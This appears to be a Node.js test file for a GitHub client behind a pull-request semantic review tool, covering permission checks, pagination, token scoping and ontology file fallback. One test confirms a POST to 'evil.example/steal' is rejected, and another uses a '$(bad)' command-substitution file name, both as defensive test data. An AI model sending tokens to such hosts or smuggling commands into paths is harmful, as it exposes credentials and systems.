import { test } from "node:test";
import assert from "node:assert/strict";
import { createGitHubClient, resolvePulls, isEligiblePull, collectReviewInput } from "./semantic-review-github.mjs";
import { modelToTriples, serializeTurtle } from "./owl-ontology.mjs";
import { catalogOntology } from "./semantic-review-model.mjs";

const headSha = "a".repeat(40);
const pull = {
  number: 7, state: "open", user: { login: "author" }, changed_files: 3,
  head: { sha: headSha, ref: "topic", repo: { id: 1 } },
  base: { sha: "b".repeat(40), repo: { id: 1 } }, merge_commit_sha: "c".repeat(40),
};
const blob = (text) => ({ encoding: "base64", content: Buffer.from(text).toString("base64") });
const absent = (path) => { throw Object.assign(new Error(`GitHub API GET returned 404 for ${path}`), { status: 404 }); };

test("same-repository authors with write, maintain, or admin permission are eligible", async () => {
  for (const permission of ["write", "maintain", "admin"]) {
    assert.equal(await isEligiblePull({ get: async () => ({ permission }) }, pull), true);
  }
  assert.equal(await isEligiblePull({ get: async () => ({ permission: "read" }) }, pull), false);
  assert.equal(await isEligiblePull({ get: async () => ({ permission: "write" }) }, {
    ...pull, head: { ...pull.head, repo: { id: 2 } },
  }), false);
});

test("resolvePulls refreshes the live PR rather than trusting stale event fields", async () => {
  const client = { get: async (path) => {
    assert.match(path, /\/pulls\/7$/);
    return pull;
  } };
  assert.deepEqual(await resolvePulls(client, { pull_requests: [{ number: 7, head: { sha: "stale" } }] }), [pull]);
});

test("resolvePulls falls back to matching head repository and branch", async () => {
  const client = {
    getAll: async (path) => {
      assert.match(path, /head=org%3Atopic/);
      return [pull, { ...pull, number: 8, head: { ...pull.head, repo: { id: 2 } } }];
    },
    get: async (path) => {
      assert.match(path, /\/pulls\/7$/);
      return pull;
    },
  };
  const result = await resolvePulls(client, { pull_requests: [], head_branch: "topic",
    head_repository: { id: 1, owner: { login: "org" } } });
  assert.deepEqual(result, [pull]);
});

test("fallback rejects a mismatched run revision and marks ambiguous matches", async () => {
  const mismatched = await resolvePulls({ getAll: async () => [pull], get: async () => pull },
    { pull_requests: [], head_branch: "topic", head_repository: { id: 1, owner: { login: "org" } },
      head_sha: "d".repeat(40) });
  assert.deepEqual(mismatched, []);
  const second = { ...pull, number: 8 };
  const client = { getAll: async () => [pull, second], get: async (path) => path.endsWith("/7") ? pull : second };
  const ambiguous = await resolvePulls(client,
    { pull_requests: [], head_branch: "topic", head_repository: { id: 1, owner: { login: "org" } },
      head_sha: headSha });
  assert.equal(ambiguous.length, 2);
  assert.ok(ambiguous.every((item) => item.semanticAssociationAmbiguous));
});

test("getAll follows Link pagination and encodes user-controlled paths", async () => {
  const urls = [];
  const fetchImpl = async (url) => {
    urls.push(url);
    const next = urls.length === 1 ? '<https://api.github.com/repos/org/repo/pulls/7/files?page=2>; rel="next"' : null;
    return { ok: true, status: 200, headers: { get: () => next }, json: async () => [urls.length] };
  };
  const client = createGitHubClient({ token: "token", repository: "org/repo", fetchImpl });
  assert.deepEqual(await client.getAll("/pulls/7/files?per_page=100"), [1, 2]);
  assert.equal(urls.length, 2);
  assert.equal(urls[0], "https://api.github.com/repos/org/repo/pulls/7/files?per_page=100");
});

test("client writes JSON with the GitHub token only to repository API paths", async () => {
  const calls = [];
  const client = createGitHubClient({ token: "github-token", repository: "org/repo",
    fetchImpl: async (url, request) => {
      calls.push({ url, request });
      return { ok: true, status: 201, headers: { get: () => null }, json: async () => ({ id: 1 }) };
    } });
  await client.post("/issues/7/comments", { body: "hello" });
  assert.equal(calls[0].url, "https://api.github.com/repos/org/repo/issues/7/comments");
  assert.equal(calls[0].request.method, "POST");
  assert.equal(calls[0].request.headers.Authorization, "Bearer github-token");
  assert.deepEqual(JSON.parse(calls[0].request.body), { body: "hello" });
  await assert.rejects(() => client.post("https://evil.example/steal", {}), /outside this repository/);
});

test("a GitHub authorization error identifies the method and required permission", async () => {
  const client = createGitHubClient({ token: "token", repository: "org/repo", fetchImpl: async () => ({
    ok: false, status: 403, headers: { get: (name) => name === "x-accepted-github-permissions" ? "issues=write" : null },
    json: async () => ({ message: "Resource not accessible by integration" }),
  }) });
  await assert.rejects(() => client.post("/issues/7/comments", { body: "test" }),
    /POST.*403.*issues=write.*Resource not accessible by integration/);
});

test("collector reads complete changed Markdown blobs, including renamed destinations", async () => {
  const files = [
    { filename: "docs/a file $(bad).md", status: "modified", sha: "blob-a" },
    { filename: "docs/new.md", status: "renamed", sha: "blob-new" },
    { filename: "docs/old.md", status: "removed", sha: "blob-old" },
    { filename: "docs/skip.md", status: "modified", sha: "blob-skip" },
    { filename: "src/app.js", status: "modified", sha: "blob-js" },
  ];
  const client = {
    getAll: async () => files,
    getContentText: async (path) => path === "docs/ontology.md" ? "# proposed ontology" : absent(path),
    get: async (path) => {
      if (path.endsWith("/git/blobs/blob-a")) return blob("unchanged line\nchanged line\n");
      if (path.endsWith("/git/blobs/blob-new")) return blob("renamed content");
      throw new Error(`unexpected ${path}`);
    },
  };
  const result = await collectReviewInput(client, { ...pull, changed_files: files.length },
    { ontologyPath: "docs/ontology.md", ignorePaths: ["docs/skip.md"] });
  assert.deepEqual(result.files, [
    { path: "docs/a file $(bad).md", text: "unchanged line\nchanged line\n" },
    { path: "docs/new.md", text: "renamed content" },
  ]);
  assert.equal(result.ontologyText, "# proposed ontology");
  assert.deepEqual(result.unreviewed, []);
  assert.equal(result.headSha, headSha);
});

test("unreadable blobs and truncated file listings are incomplete, never silently clean", async () => {
  const client = {
    getAll: async () => [{ filename: "docs/a.md", status: "modified", sha: "blob-a" }],
    getContentText: async (path) => path === "docs/ontology.ttl" ? absent(path) : "# ontology",
    get: async () => ({ encoding: "base64", content: "%%%" }),
  };
  const result = await collectReviewInput(client, { ...pull, changed_files: 4 },
    { ontologyPath: "docs/ontology.md", ignorePaths: [] });
  assert.deepEqual(result.files, []);
  assert.ok(result.unreviewed.some((item) => item.path === "docs/a.md"));
  assert.ok(result.unreviewed.some((item) => item.reason.includes("listing")));
});

test("failed file pagination is reported as incomplete coverage", async () => {
  const client = {
    getAll: async () => { throw new Error("page 2 failed"); },
    getContentText: async (path) => path === "docs/ontology.ttl" ? absent(path) : "# ontology",
  };
  const result = await collectReviewInput(client, pull, { ontologyPath: "docs/ontology.md", ignorePaths: [] });
  assert.deepEqual(result.files, []);
  assert.match(result.unreviewed[0].reason, /listing is unavailable/);
});

// B25: the reviewer reads the ontology source, rendered as build-ontology.mjs renders it (ADR 0029).
const SOURCE_MODEL = { projectName: "Widgets", invariants: [{ concept: "Analysis", text: "scores only stored sessions." }], sections: {
  Entities: [{ name: "Analysis", cells: { Properties: "`analysisId`", Description: "One scoring pass." } },
    { name: "Speaker", cells: { Properties: "`speakerCode`", Description: "A person." } }],
  Enums: [{ name: "SessionRemovalState", cells: { Values: "`Requested`, `Removed`", Description: "Where a removal stands." } }],
  Relationships: [{ name: "Analysis", cells: { Relationship: "credits", To: "`Speaker`", Cardinality: "many → many" } }],
} };
const SOURCE_TTL = serializeTurtle(modelToTriples(SOURCE_MODEL), { namespaceUri: "https://ontology.example/widgets#" });

function sourceClient(contents) {
  const calls = [];
  return { calls, getAll: async () => [],
    getContentText: async (file) => {
      calls.push("/contents/" + file);
      if (!Object.hasOwn(contents, file)) return absent(file);
      const value = contents[file];
      if (value instanceof Error) throw value;
      return value;
    } };
}
const listed = { ...pull, changed_files: 0 };

test("B25 the collector renders ontology.ttl as build-ontology.mjs does and does not read ontology.md", async () => {
  const client = sourceClient({ "docs/ontology.ttl": SOURCE_TTL, "docs/ontology.md": "# stale Markdown" });
  const result = await collectReviewInput(client, listed, { ontologyPath: "docs/ontology.md", ignorePaths: [] });
  assert.deepEqual(client.calls, ["/contents/docs/ontology.ttl"]);
  assert.match(result.ontologyText, /^# Widgets — Application Ontology\n/);
  const catalog = catalogOntology(result.ontologyText, { required: ["Entities", "Enums", "Relationships", "Business Rules & Invariants"], optional: [] });
  assert.deepEqual([...catalog.evidenceKeys], ["Entities:Analysis", "Entities:Speaker", "Enums:SessionRemovalState",
    "Relationships:Analysis", "Business Rules & Invariants:Analysis"]);
  assert.deepEqual(catalog.groups.get("Relationships:Analysis").rows, ["| `Analysis` | credits | `Speaker` | many → many |"]);
  assert.deepEqual(catalog.relationships, [{ evidenceKey: "Relationships:Analysis", from: "Analysis", to: "Speaker" }]);
});

test("B25 the collector reads ontology.md when ontology.ttl is absent at the revision", async () => {
  const client = sourceClient({ "docs/ontology.md": "# proposed ontology" });
  const result = await collectReviewInput(client, listed, { ontologyPath: "docs/ontology.md", ignorePaths: [] });
  assert.equal(result.ontologyText, "# proposed ontology");
  assert.deepEqual(client.calls, ["/contents/docs/ontology.ttl", "/contents/docs/ontology.md"]);
});

test("B25 an unreadable or unparseable ontology source fails the read instead of falling back", async () => {
  const config = { ontologyPath: "docs/ontology.md", ignorePaths: [] };
  await assert.rejects(collectReviewInput(sourceClient({ "docs/ontology.ttl": Object.assign(new Error("GitHub API GET returned 500 for /contents"), { status: 500 }),
    "docs/ontology.md": "# ontology" }), listed, config), /returned 500/);
  await assert.rejects(collectReviewInput(sourceClient({ "docs/ontology.ttl": "this is not turtle", "docs/ontology.md": "# ontology" }),
    listed, config));
});

test("B25 an ontology path without .md is read as Markdown only", async () => {
  const client = sourceClient({ "docs/ontology.markdown": "# proposed ontology" });
  const result = await collectReviewInput(client, listed, { ontologyPath: "docs/ontology.markdown", ignorePaths: [] });
  assert.equal(result.ontologyText, "# proposed ontology");
  assert.deepEqual(client.calls, ["/contents/docs/ontology.markdown"]);
});

function rawCollectorClient(responses) {
  const calls = [];
  const client = createGitHubClient({ token: "token", repository: "org/repo", fetchImpl: async (url, request) => {
    const { pathname, search } = new URL(url);
    if (pathname.endsWith("/pulls/7/files")) return new Response("[]");
    const path = pathname.slice("/repos/org/repo/contents/".length);
    calls.push({ path, search, method: request.method, accept: request.headers.Accept });
    assert.ok(Object.hasOwn(responses, path), path);
    return responses[path];
  } });
  return { calls, client };
}

const rawCall = (path) => ({ path, search: `?ref=${headSha}`, method: "GET", accept: "application/vnd.github.raw+json" });

test("B25 a numeric source 404 tries raw Markdown once at the same reviewed revision", async () => {
  const { client, calls } = rawCollectorClient({
    "docs/my%20ontology.ttl": new Response('{"message":"Not found"}', { status: 404 }),
    "docs/my%20ontology.md": new Response("\uFEFF# proposed ontology — café\n"),
  });
  const result = await collectReviewInput(client, listed, { ontologyPath: "docs/my ontology.md", ignorePaths: [] });
  assert.equal(result.ontologyText, "# proposed ontology — café\n");
  assert.deepEqual(calls, [rawCall("docs/my%20ontology.ttl"), rawCall("docs/my%20ontology.md")]);
});

test("B25 a raw path without a Markdown extension is read once as Markdown", async () => {
  const { client, calls } = rawCollectorClient({
    "docs/ontology.markdown": new Response("# proposed ontology\n"),
  });
  const result = await collectReviewInput(client, listed, { ontologyPath: "docs/ontology.markdown", ignorePaths: [] });
  assert.equal(result.ontologyText, "# proposed ontology\n");
  assert.deepEqual(calls, [rawCall("docs/ontology.markdown")]);
});

test("B25 a non-404 response mentioning 404 cannot trigger the raw Markdown fallback", async () => {
  const { client, calls } = rawCollectorClient({
    "docs/ontology.ttl": new Response('{"message":"upstream returned 404 while handling this request"}', { status: 500 }),
  });
  await assert.rejects(collectReviewInput(client, listed, { ontologyPath: "docs/ontology.md", ignorePaths: [] }),
    { status: 500, message: /returned 500/ });
  assert.deepEqual(calls, [rawCall("docs/ontology.ttl")]);
});

test("B25 invalid UTF-8 in a raw source fails without trying Markdown", async () => {
  const { client, calls } = rawCollectorClient({
    "docs/ontology.ttl": new Response(Uint8Array.of(0xc3, 0x28)),
  });
  await assert.rejects(collectReviewInput(client, listed, { ontologyPath: "docs/ontology.md", ignorePaths: [] }),
    { code: "ERR_ENCODING_INVALID_ENCODED_DATA" });
  assert.deepEqual(calls, [rawCall("docs/ontology.ttl")]);
});
